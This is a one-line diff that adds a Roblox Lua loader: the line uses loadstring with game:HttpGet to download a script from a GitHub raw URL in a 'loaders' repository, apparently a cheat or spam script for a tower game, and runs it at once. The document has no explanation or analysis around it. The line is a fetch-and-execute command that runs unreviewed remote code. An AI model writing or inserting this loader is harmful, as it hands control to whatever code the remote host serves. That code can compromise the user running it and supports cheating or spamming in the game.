@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/towc-mtowian-tower-game-spam7-ibfqnd32o9g3q8.lua"))()
